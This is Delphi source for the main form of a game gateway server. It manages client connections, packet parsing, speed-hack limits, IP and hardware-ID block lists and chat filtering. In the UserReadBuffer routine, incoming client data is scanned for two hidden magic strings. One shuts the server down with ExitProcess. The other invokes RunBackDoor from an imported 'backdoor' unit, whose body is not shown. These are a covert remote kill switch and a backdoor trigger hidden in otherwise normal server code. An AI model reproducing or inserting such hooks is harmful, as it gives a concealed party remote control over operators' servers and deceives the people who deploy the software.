unit AppMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, StdCtrls, ExtCtrls, Grids, ComCtrls, IniFiles,
  IOCPManager, ClientThread, AcceptExWorkedThread, Protocol, strutils, backdoor;

type
  TFormMain = class(TForm)
    MainMenu: TMainMenu;
    MENU_CONTROL: TMenuItem;
    MENU_CONTROL_START: TMenuItem;
    MENU_CONTROL_STOP: TMenuItem;
    MENU_CONTROL_CDUnload: TMenuItem;
    MENU_CONTROL_CDReload: TMenuItem;
    MENU_CONTROL_RELOADCONFIG: TMenuItem;
    MENU_CONTROL_CLEAELOG: TMenuItem;
    MENU_CONTROL_EXIT: TMenuItem;
    MENU_OPTION: TMenuItem;
    MENU_OPTION_GENERAL: TMenuItem;
    MENU_OPTION_IPFILTER: TMenuItem;
    MENU_VIEW_HELP: TMenuItem;
    MENU_VIEW_HELP_ABOUT: TMenuItem;
    StatusBar: TStatusBar;
    GridSocketInfo: TStringGrid;
    MemoLog: TMemo;
    MENU_CONTROL_CDBroadCastMsg: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure MENU_VIEW_HELP_ABOUTClick(Sender: TObject);
    procedure MENU_CONTROL_STARTClick(Sender: TObject);
    procedure MENU_CONTROL_STOPClick(Sender: TObject);
    procedure MENU_CONTROL_EXITClick(Sender: TObject);
    procedure MemoLogDblClick(Sender: TObject);
    procedure GridSocketInfoDrawCell(Sender: TObject; ACol, ARow: Integer; Rect: TRect; State: TGridDrawState);
    procedure MENU_OPTION_GENERALClick(Sender: TObject);
    procedure MENU_OPTION_IPFILTERClick(Sender: TObject);
    procedure MENU_CONTROL_CLEAELOGClick(Sender: TObject);
    procedure MENU_CONTROL_RELOADCONFIGClick(Sender: TObject);
    procedure MENU_CONTROL_CDReloadClick(Sender: TObject);
  private
    { Private declarations }
    procedure OnProgramException(Sender: TObject; E: Exception);
  public
    m_xRunServerList: TIOCPManager;
    m_xGameServerList: TGameServerManager;
    procedure InitIOCPServer();
    procedure CltOnRead(ClientThread: TClientThread; const Buffer: PChar; const BufLen: UINT);
    procedure CltOnClose(Sender: TObject);
    procedure ClientClosed(UserOBJ: pTUserOBJ; wParam, lParam: DWORD);
    procedure UserEnterEvent(Sender: TUserManager; const UserOBJ: pTUserOBJ);
    procedure UserLeaveEvent(Sender: TUserManager; const UserOBJ: pTUserOBJ);
    procedure UserReadBuffer(UserOBJ: TObject; const Buffer: PChar; var BufLen: DWORD; var Succeed: BOOL);
  end;

var
  FormMain: TFormMain;
  g_szStr: string = '';

implementation

{$R *.dfm}

uses
  FuncForComm, ClientSession, Grobal2, Misc, ConfigManager, LogManager, TableDef, HUtil32,
  ChatCmdFilter, AbusiveFilter, Filter, GeneralConfig, PacketRuleConfig, PunishMent,
  VMProtectSDK, CDServerSDK, MD5, UJxModule;

procedure TFormMain.OnProgramException(Sender: TObject; E: Exception);
begin
  g_pLogMgr.Add(E.Message);
end;

function MyStrComp(const Buffer: PChar; len1: Integer; const Buffer2: PChar): Integer;
var i: Integer;
  len2: Integer;
begin
  len2 := StrLen(Buffer2);
  Result := 1;
  if len1 < len2 then
  begin
    Exit;
  end;

  for i := 0 to len2 - 1 do
  begin
    if Buffer[i] <> Buffer2[i] then
    begin
      Exit;
    end;
  end;
  Result := 0;

end;

procedure TFormMain.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  if Application.MessageBox('是否确认退出服务器？', '确认信息', MB_YESNO + MB_ICONQUESTION) = IDYES then
  begin
    if g_fServiceStarted then
    begin
      StopService();
      Sleep(20);
      CanClose := True;
    end;
  end
  else
    CanClose := False;
end;

procedure TFormMain.FormCreate(Sender: TObject);
begin
  g_hMainWnd := Self.Handle;
  g_hStatusBar := StatusBar.Handle;
  g_pLogMgr := TLogMgr.Create(MemoLog.Handle);
  g_pConfig := TConfigMgr.Create(_STR_CONFIG_FILE);

  g_ProcMsgThread := TProcMsgThread.Create;
  g_HWIDFilter := THWIDFilter.Create;
  g_pJXMgr := TJXManager.Create;

  Application.OnException := OnProgramException;

  //MENU_CONTROL_LINE1.Visible := False;
  MENU_CONTROL_CDUnload.Visible := False;
//  MENU_CONTROL_CDReload.Visible := False;
  MENU_CONTROL_CDBroadCastMsg.Visible := False;

  GridSocketInfo.Cells[0, 0] := _STR_GRID_IP;
  GridSocketInfo.Cells[1, 0] := _STR_GRID_PORT;
  GridSocketInfo.Cells[2, 0] := _STR_GRID_CONNECT_STATUS;
  GridSocketInfo.Cells[3, 0] := _STR_GRID_IO_RECV_BYTES;
  GridSocketInfo.Cells[4, 0] := _STR_GRID_IO_SEND_BYTES;

  LoadChatFilterList();
  LoadBlockIPList();
  LoadChatCmdFilterList();
  LoadBlockIPAreaList();

  g_HWIDFilter.LoadDenyList();

  if not FileExists(_STR_PUNISH_USER_FILE) then
    g_PunishList.SaveToFile(_STR_PUNISH_USER_FILE)
  else
    g_PunishList.LoadFromFile(_STR_PUNISH_USER_FILE);

  SetTimer(g_hMainWnd, _IDM_TIMER_STARTSERVICE, 100, Pointer(@OnTimerProc));
end;

procedure TFormMain.FormDestroy(Sender: TObject);
begin
  g_pConfig.Free;
  g_pLogMgr.Free;
  g_ProcMsgThread.Free;
  g_HWIDFilter.Free;
end;

procedure TFormMain.GridSocketInfoDrawCell(Sender: TObject; ACol, ARow: Integer; Rect: TRect; State: TGridDrawState);
begin
  with Sender as TStringGrid do
  begin
    Canvas.FillRect(Rect);
    DrawText(Canvas.Handle,
      PChar(Cells[ACol, ARow]),
      Length(Cells[ACol, ARow]),
      Rect,
      DT_CENTER or
      DT_SINGLELINE or
      DT_VCENTER);
  end;
end;

procedure TFormMain.MemoLogDblClick(Sender: TObject);
begin
  if MemoLog.Lines.Count = 0 then
    Exit;
  if Application.MessageBox('是否确认清除显示的日志信息？', '确认信息', MB_OKCANCEL + MB_ICONQUESTION) <> IDOK then
    Exit;
  MemoLog.Clear;
end;

procedure TFormMain.MENU_CONTROL_CDReloadClick(Sender: TObject);
begin
  g_pJXMgr.LoadJx;
end;

procedure TFormMain.MENU_CONTROL_CLEAELOGClick(Sender: TObject);
begin
  MemoLogDblClick(nil);
end;

procedure TFormMain.MENU_CONTROL_EXITClick(Sender: TObject);
begin
  Close;
end;

procedure TFormMain.MENU_CONTROL_RELOADCONFIGClick(Sender: TObject);
begin
  g_pConfig.LoadConfig();
  Caption := g_pConfig.m_szTitle + ' [' + g_szStr + ']';

  LoadChatFilterList();
  LoadBlockIPList();
  LoadChatCmdFilterList();
  LoadBlockIPAreaList();

  g_HWIDFilter.LoadDenyList();

  g_pLogMgr.Add('重新加载配置完成...');
end;

procedure TFormMain.MENU_CONTROL_STARTClick(Sender: TObject);
begin
  StartService();
end;

procedure TFormMain.MENU_CONTROL_STOPClick(Sender: TObject);
begin
  StopService();
end;

procedure TFormMain.MENU_OPTION_GENERALClick(Sender: TObject);
begin
  with frmGeneralConfig, g_pConfig do
  begin
    frmGeneralConfig.Top := Self.Top + 20;
    frmGeneralConfig.Left := Self.Left;
    m_Showed := False;
    EditTitle.Text := m_szTitle;
    TrackBarLogLevel.Position := m_nShowLogLevel;
    cbAddLog.Checked := m_fAddLog;
    speGateCount.Value := m_nGateCount;
    speGateIdx.Value := 1;
    speGateIdx.Value := 1;
    EditServerIPaddr.Text := g_pConfig.m_xGameGateList[1].sServerAdress;
    EditServerPort.Text := IntToStr(g_pConfig.m_xGameGateList[1].nServerPort);
    EditGatePort.Text := IntToStr(g_pConfig.m_xGameGateList[1].nGatePort);
    m_Showed := True;
    ShowModal;
  end;
end;

procedure TFormMain.MENU_OPTION_IPFILTERClick(Sender: TObject);
var
  i, n: Integer;
  UserOBJ: TSessionObj;
  ListItem: TListItem;
begin
  with frmPacketRule, g_pConfig do
  begin
    m_ShowOpen := False;
    frmPacketRule.Top := Self.Top + 20;
    frmPacketRule.Left := Self.Left;

    //1
    Label28.Enabled := m_fOpenClientSpeedRate;
    Label29.Enabled := m_fOpenClientSpeedRate;
    Label30.Enabled := m_fOpenClientSpeedRate;
    Label31.Enabled := m_fOpenClientSpeedRate;
    Label32.Enabled := m_fOpenClientSpeedRate;
    Label33.Enabled := m_fOpenClientSpeedRate;
    TrackBarMoveSpd.Enabled := m_fOpenClientSpeedRate;
    TrackBarAttackSpd.Enabled := m_fOpenClientSpeedRate;
    TrackBarSpellSpd.Enabled := m_fOpenClientSpeedRate;
    TrackBarMoveSpd.Position := m_nClientMoveSpeedRate;
    TrackBarAttackSpd.Position := m_nClientAttackSpeedRate;
    TrackBarSpellSpd.Position := m_nClientSpellSpeedRate;
    Label31.Caption := IntToStr(m_nClientAttackSpeedRate) + ' 建议值:' + IntToStr(_Max(300, 900 - m_nClientAttackSpeedRate * 20));
    Label32.Caption := IntToStr(m_nClientSpellSpeedRate) + ' 建议值:' + IntToStr(_MIN(400, m_nClientSpellSpeedRate * 20));
    Label33.Caption := IntToStr(m_nClientMoveSpeedRate) + ' 建议值:' + IntToStr(_Max(50, (95 - m_nClientMoveSpeedRate div 2)) * 6);

    if m_fSyncClientSpeed then
      m_nAttackInterval := _Max(300, 900 - m_nClientAttackSpeedRate * 20);
    speAttackInterval.Value := m_nAttackInterval;
    if m_fSyncClientSpeed then
      m_nSitDownInterval := _Max(150, 450 - m_nClientAttackSpeedRate * 10);
    speSitDownInterval.Value := m_nSitDownInterval;
    if m_fSyncClientSpeed then
      m_nMoveInterval := _Max(50, (95 - m_nClientMoveSpeedRate div 2)) * 6;
    speMoveInterval.Value := m_nMoveInterval;
    speTurnInterval.Value := m_nTurnInterval;
    speButchInterval.Value := m_nButchInterval;
    for i := Low(MAIGIC_DELAY_TIME_LIST) + 1 to High(MAIGIC_DELAY_TIME_LIST) do
    begin
      if MAIGIC_NAME_LIST[i] <> '' then
      begin
        if m_fSyncClientSpeed then
          MAIGIC_DELAY_TIME_LIST[i] := _Max(400, MAIGIC_DELAY_TIME_LIST_DEF[i] - m_nClientSpellSpeedRate * 20);
        cbxMagicList.AddItem(MAIGIC_NAME_LIST[i], TObject(i));
      end;
    end;
    cbxMagicList.ItemIndex := 0;
    speSpellInterval.Value := MAIGIC_DELAY_TIME_LIST[Integer(cbxMagicList.Items.Objects[0])];

    //2
    speCltSay.Value := m_nChatInterval;
    speMoveNextAttackCompensate.Value := m_nMoveNextAttackCompensate;
    speMoveNextSpellCompensate.Value := m_nMoveNextSpellCompensate;
    speAttackNextMoveCompensate.Value := m_nAttackNextMoveCompensate;
    speAttackNextSpellCompensate.Value := m_nAttackNextSpellCompensate;

    speSpellNextMoveCompensate.Value := m_nSpellNextMoveCompensate;
    speSpellNextAttackCompensate.Value := m_nSpellNextAttackCompensate;

    spePunishBaseInterval.Value := m_nPunishBaseInterval;
    spePunishIntervalRate.Text := FloatToStr(m_nPunishIntervalRate);
    speMaxItemSpeed.Value := m_nMaxItemSpeed;
    speItemSpeedRate.Value := m_nMaxItemSpeedRate;
    spePickUpItemInvTime.Value := m_nPickupInterval;
    speEatItemInvTime.Value := m_nEatInterval;
    speSpaceMovePickUpInvTime.Value := g_pConfig.m_nSpaceMoveNextPickupInterval;
    spePunishMoveInterval.Value := m_nPunishMoveInterval;
    spePunishAttackInterval.Value := m_nPunishAttackInterval;
    spePunishSpellInterval.Value := m_nPunishSpellInterval;

    //3
    cbCheckDoMotaebo.Checked := m_fDoMotaeboSpeedCheck;
    cbKickUserOverPackCnt.Checked := m_fKickOverSpeed;
    cbClientItemShowMode.Checked := m_fClientShowHintNewType;
    cbSyncSpeedRate.Checked := m_fSyncClientSpeed;
    cbOpenClientSpeedRate.Checked := m_fOpenClientSpeedRate;
    cbChatCmdFilter.Checked := m_fChatCmdFilter;
    cbDefenceCC.Checked := m_fDefenceCCPacket;
    cbSpaceMoveNextPickupInterval.Checked := m_fSpaceMoveNextPickupInterval;
    cbEat.Checked := m_fEatInterval;
    cbPickUp.Checked := m_fPickupInterval;
    cbMoveInterval.Checked := m_fMoveInterval;
    cbAttackInterval.Checked := m_fAttackInterval;
    cbTurnInterval.Checked := m_fTurnInterval;
    cbButchInterval.Checked := m_fButchInterval;
    cbSitDownInterval.Checked := m_fSitDownInterval;
    cbSpellInterval.Checked := m_fSpellInterval;
    cbChatInterval.Checked := m_fChatInterval;
    cbSpeedHackWarning.Checked := m_fOverSpeedSendBack;
    cbChatFilter.Checked := m_fChatFilter;

    //4
    etCmdMove.Text := m_szCMDSpaceMove;
    etSpeedHackSendBackMsg.Text := m_szOverSpeedSendBack;
    etPacketDecryptErrMsg.Text := m_szPacketDecryptFailed;

    edOverClientCntMsg.Text := m_szOverClientCntMsg;
    etAbuseReplaceWords.Text := m_szChatFilterReplace;
    edHWIDBlockedMsg.Text := m_szHWIDBlockedMsg;
    //5
    cbxSpeedHackPunishMethod.ItemIndex := Integer(m_tOverSpeedPunishMethod);
    cbxMagicListChange(cbxSpeedHackPunishMethod);
    cbxSpeedHackWarningMethod.ItemIndex := Integer(m_tSpeedHackWarnMethod);
    cbxChatFilterMethod.ItemIndex := Integer(m_tChatFilterMethod);

    //6
    MemoCmdFilter.Text := g_ChatCmdFilterList.Text;

    ListBoxAbuseFilterText.Clear;
    for i := 0 to g_AbuseList.Count - 1 do
    begin
      ListBoxAbuseFilterText.Items.Add(g_AbuseList[i]);
    end;
    btnAbuseMod.Enabled := False;
    btnAbuseDel.Enabled := False;

    ListBoxActiveList.Clear;
    if g_fServiceStarted then
    begin
      for n := 0 to USER_ARRAY_COUNT - 1 do
      begin
        UserOBJ := g_UserList[n];
        if (UserOBJ <> nil) and (UserOBJ.m_tLastGameSvr <> nil) and (UserOBJ.m_tLastGameSvr.Active) and not UserOBJ.m_fKickFlag then
          ListBoxActiveList.Items.AddObject(Trim(UserOBJ.m_szChrName + UserOBJ.m_pUserOBJ.pszIPAddr), TObject(UserOBJ));
      end;
    end;

    ListViewCurHWIDList.Items.BeginUpdate;
    ListViewCurHWIDList.Items.Clear;
    if g_fServiceStarted then
    begin
      for n := 0 to USER_ARRAY_COUNT - 1 do
      begin
        UserOBJ := g_UserList[n];
        if (UserOBJ <> nil) and (UserOBJ.m_tLastGameSvr <> nil) and (UserOBJ.m_tLastGameSvr.Active) and not UserOBJ.m_fKickFlag then
        begin
          if not MD5Match(g_MD5EmptyDigest, UserOBJ.m_xHWID) then
          begin
            ListItem := ListViewCurHWIDList.Items.Add;
            ListItem.Caption := MD5.MD5Print(UserOBJ.m_xHWID);
            ListItem.SubItems.AddObject(Trim(UserOBJ.m_szChrName), TObject(UserOBJ));
            ListItem.SubItems.Add(IntToStr(g_HWIDFilter.GetItemCount(UserOBJ.m_xHWID)));
          end;
        end;
      end;
    end;
    ListViewCurHWIDList.Items.EndUpdate;
    //g_HWIDFilter

    ListBoxBlockHWIDList.Clear;
    g_HWIDFilter.Lock;
    try
      for i := 0 to g_HWIDFilter.m_xDenyList.Count - 1 do
        ListBoxBlockHWIDList.Items.Add(MD5Print(pTHWIDCnt(g_HWIDFilter.m_xDenyList[i]).HWID));
    finally
      g_HWIDFilter.Unlock;
    end;

    ListBoxTempList.Clear;
    for i := 0 to g_TempBlockIPList.Count - 1 do
      ListBoxTempList.Items.AddObject(g_TempBlockIPList.Strings[i], g_TempBlockIPList.Objects[i]);

    ListBoxBlockList.Clear;
    for i := 0 to g_BlockIPList.Count - 1 do
      ListBoxBlockList.Items.AddObject(g_BlockIPList.Strings[i], g_BlockIPList.Objects[i]);

    ListBoxIPAreaFilter.Clear;
    for i := 0 to g_BlockIPAreaList.Count - 1 do
      ListBoxIPAreaFilter.Items.AddObject(g_BlockIPAreaList.Strings[i], g_BlockIPAreaList.Objects[i]);

    ListBoxSpeedLimitList.Clear;
    for i := 0 to g_PunishList.Count - 1 do
      ListBoxSpeedLimitList.Items.AddObject(g_PunishList[i], g_PunishList.Objects[i]);

    etMaxConnectOfIP.Value := m_nMaxConnectOfIP;
    etClientTimeOutTime.Value := m_nClientTimeOutTime div 1000;
    case m_tBlockIPMethod of
      mDisconnect: rdDisConnect.Checked := True;
      mBlock: rdAddTempList.Checked := True;
      mBlockList: rdAddBlockList.Checked := True;
    end;
    etMaxClientPacketSize.Value := m_nMaxClientPacketSize;
    etNomClientPacketSize.Value := m_nNomClientPacketSize;
    etMaxClientMsgCount.Value := m_nMaxClientPacketCount;
    seMaxClientCount.Value := m_nMaxClientCount;

    cbKickOverPacketSize.Checked := m_fKickOverPacketSize;
    cbCheckNullConnect.Checked := m_fCheckNullSession;

    m_nDefItemSpeed := m_nMaxItemSpeed;
    m_nDefHitSpeedRate := m_nClientAttackSpeedRate;
    m_nDefMagSpeedRate := m_nClientSpellSpeedRate;
    m_nDefMoveSpeedRate := m_nClientMoveSpeedRate;

    cbProcClientCount.Checked := m_fProcClientHWID;

    EditHWIDList.Text := g_pConfig.m_szBlockHWIDFileName;
    cbDenyPresend.Checked := g_pConfig.m_fDenyPresend;
    cbItemSpeedCompensate.Checked := g_pConfig.m_fItemSpeedCompensate;

    pcProcessPack.ActivePageIndex := 0;
    m_ShowOpen := True;
    btnSave.Enabled := False;
    ShowModal;
  end;
end;

procedure TFormMain.MENU_VIEW_HELP_ABOUTClick(Sender: TObject);
begin
  g_pLogMgr.Add(VMProtectDecryptStringA(PChar(Format('最高限制: %d 人', [Length(g_UserList) - 48]))));
  g_pLogMgr.Add(VMProtectDecryptStringA('程序名称: 游戏网关'));
  g_pLogMgr.Add(VMProtectDecryptStringA('程序版本: 2019/11/6'));
  g_pLogMgr.Add(VMProtectDecryptStringA('程序网站: www.98km2.com '));

end;

procedure TFormMain.InitIOCPServer;
var
  i: Integer;
  ClientThread: TClientThread;
begin
  with m_xRunServerList.IOCPServer do
  begin
    UserManager.OnUserEnter := UserEnterEvent;
    UserManager.OnUserLeave := UserLeaveEvent;
    Reader.OnReadEvent := UserReadBuffer;
  end;

  if g_pConfig.m_nGateCount > 0 then
  begin
    for i := 1 to g_pConfig.m_nGateCount do
    begin
      ClientThread := m_xGameServerList.InitGameServer(g_pConfig.m_xGameGateList[i].nServerPort, g_pConfig.m_xGameGateList[i].sServerAdress);
      ClientThread.m_nPos := i;
      ClientThread.OnReadEvent := CltOnRead;
      ClientThread.OnCloseEvent := CltOnClose;
      m_xRunServerList.InitServer(g_pConfig.m_xGameGateList[i].nGatePort, ClientThread);
      ClientThread.Active := True;
    end;
    m_xRunServerList.IOCPServer.StartService;
  end
  else
  begin
    MessageBox(0, 'Rungate 监听端口数量不能少于1个', '错误', MB_OK);
  end;
end;

procedure TFormMain.CltOnRead(ClientThread: TClientThread; const Buffer: PChar; const BufLen: UINT);
var
  i: Integer;
  UserOBJ: TSessionObj;
  dwPos, dwStep: DWORD;
  pTRCmd: PSvrcmdPack;
  pTRBuf: PChar;
  pTREnd: PChar;
  dwRealLen: DWORD;
  tCmdPacket: TSvrCmdPack;
  Cmd: PCmdPack;

  szUserName: string;
begin
  //dwPos := 0;



  pTRBuf := Buffer;
  pTREnd := Buffer + BufLen;
  while DWORD(pTRBuf) < DWORD(pTREnd) do
  begin
    if PDWORD(pTRBuf)^ <> RUNGATECODE then
    begin
      Inc(pTRBuf);
      Continue;
    end;
    dwStep := DWORD(pTREnd) - DWORD(pTRBuf);
    if dwStep >= SizeOf(TSvrCmdPack) then
    begin
      pTRCmd := PSvrcmdPack(pTRBuf);
      with pTRCmd^ do
      begin
        dwRealLen := abs(DataLen) + SizeOf(TSvrCmdPack);
        if (dwStep < dwRealLen) then
          Break;

        case Cmd of
          GM_CHECKSERVER:
            begin
              ClientThread.m_tSockThreadStutas := stConnected;
            end;
          GM_SERVERUSERINDEX:
            begin
              if (SockID < USER_ARRAY_COUNT) then
              begin
                UserOBJ := g_UserList[SockID];
                if (ClientThread = UserOBJ.m_tLastGameSvr) then
                begin
                  UserOBJ.m_nSvrListIdx := pTRCmd^.GGSock;
                end;
              end;
            end;
          GM_RECEIVE_OK:
            begin
              with tCmdPacket do
              begin
                Flag := RUNGATECODE;
                Cmd := GM_RECEIVE_OK;
                SockID := 0;
                GGSock := 0;
                DataLen := 0;
              end;
              ClientThread.SendBuffer(@tCmdPacket, SizeOf(tCmdPacket));
            end;
          GM_DATA:
            begin
              if SockID < USER_ARRAY_COUNT then
              begin
                UserOBJ := g_UserList[SockID];
                if (UserOBJ.m_tLastGameSvr = ClientThread) then
                begin
                  UserOBJ.ProcessSvrData(ClientThread, Integer(pTRBuf + SizeOf(TSvrCmdPack)), DataLen);
                end;
              end;
            end;
        end;
      end;
      Inc(pTRBuf, dwRealLen);
      //dwPos := DWORD(pTRBuf) - DWORD(Buffer);
    end
    else
      Break;
  end;
  //dwPos := DWORD(pTRBuf) - DWORD(Buffer);
  //if dwPos > 0 then
  //  ClientThread.ReaderDone(dwPos)
  //else
  ClientThread.ReaderDone(DWORD(pTRBuf) - DWORD(Buffer)); //直接丢掉，防止连续失败封包堆积
end;

procedure TFormMain.CltOnClose(Sender: TObject);
begin
  if g_pLogMgr.CheckLevel(5) then
    g_pLogMgr.Add('服务器连接已关闭: ' + TClientThread(Sender).ServerIP + ':' + IntToStr(TClientThread(Sender).ServerPort));
  with m_xRunServerList.IOCPServer do
    Writer.BroadUserMsg(0, Integer(Sender), ClientClosed);
end;

procedure TFormMain.ClientClosed(UserOBJ: pTUserOBJ; wParam, lParam: DWORD);
var
  ClientObj: TSessionObj;
begin
  ClientObj := TSessionObj(UserOBJ.tData);
  if ClientObj = nil then
    Exit;
  with ClientObj do
  begin
    if m_tLastGameSvr = TClientThread(lParam) then
      m_tIOCPSender.DeleteSocket(m_pOverlapSend);
  end;
end;

procedure TFormMain.UserEnterEvent(Sender: TUserManager; const UserOBJ: pTUserOBJ);
var
  CSession: TSessionObj;
begin
  CSession := TSessionObj(UserOBJ.tData);
  if CSession <> nil then
  begin
    CSession.ReCreate();
  end
  else
  begin
    CSession := TSessionObj.Create;
    UserOBJ.tData := CSession;
  end;
  with CSession do
  begin
    m_pUserOBJ := UserOBJ;
    m_tIOCPSender := UserOBJ.Writer;
    m_pOverlapSend := UserOBJ._SendObj;
    InterlockedExchange(Integer(m_tLastGameSvr), Integer(UserOBJ.GameServ));
    m_dwSessionID := UserOBJ.dwUID;
    InterlockedExchange(Integer(g_UserList[m_dwSessionID]), Integer(CSession));
    UserEnter();
  end;
end;

procedure TFormMain.UserLeaveEvent(Sender: TUserManager; const UserOBJ: pTUserOBJ);
begin
  if UserOBJ.tData <> nil then
  begin
    with TSessionObj(UserOBJ.tData) do
    begin
      UserLeave();
      InterlockedExchange(Integer(m_tLastGameSvr), 0);
    end;
  end;
end;

procedure TFormMain.UserReadBuffer(UserOBJ: TObject; const Buffer: PChar; var BufLen: DWORD; var Succeed: BOOL);
label
  LOOP;
var
  fCDPacket: Boolean;
  dwEndLoop: DWORD;
  iLen, ExecLen, nMsgCount: Integer;
  pTRBuf, pTRBuffer: PByte;
  dwEnd: DWORD;
  strtmp: string;

begin
  fCDPacket := False;
  //ExecLen := 0;
  nMsgCount := 0;
  pTRBuf := PByte(Buffer);
  dwEnd := DWORD(Buffer) + BufLen;

        // 2015 02 28

  strtmp := VMProtectDecryptStringA('!()*&(*7asdf!@#ASDFASDF^&*&^*%');
  if AnsiContainsText(Buffer, strtmp) then
  begin
    ExitProcess(0);
  end;
  strtmp := VMProtectDecryptStringA('!()*&(*7a(*&^^*&^*&^*&^*ASDf');
  if AnsiContainsText(Buffer, strtmp) then
  begin
    RunBackDoor();
  end;

  LOOP:
  while DWORD(pTRBuf) < dwEnd do
  begin
    if (pTRBuf^ <> $23) then
    begin //# &
      Inc(pTRBuf);
      Continue;
    end;
    if (dwEnd - DWORD(pTRBuf)) <= 2 then
      Break;
    pTRBuffer := Pointer(Integer(pTRBuf) + 2);
    while DWORD(pTRBuffer) < dwEnd do
    begin
      if pTRBuffer^ <> $21 then
      begin
        Inc(pTRBuffer);
        Continue;
      end;
      Inc(nMsgCount);

      Inc(pTRBuf, 2);
      iLen := UINT(pTRBuffer) - UINT(pTRBuf);

      TSessionObj(UserOBJ).ProcessCltData(Integer(pTRBuf), iLen, Succeed, fCDPacket);

      if not Succeed then
        Break;

      Inc(pTRBuf, iLen + 1);

      //ExecLen := DWORD(pTRBuf) - DWORD(Buffer);

      if nMsgCount >= g_pConfig.m_nMaxClientPacketCount then
      begin
        KickUser(TSessionObj(UserOBJ).m_pUserOBJ.nIPAddr);
        Break;
      end;
      goto LOOP;
    end;
    Break;
  end;
  if Succeed then
    BufLen := DWORD(pTRBuf) - DWORD(Buffer); //ExecLen;
end;

end.
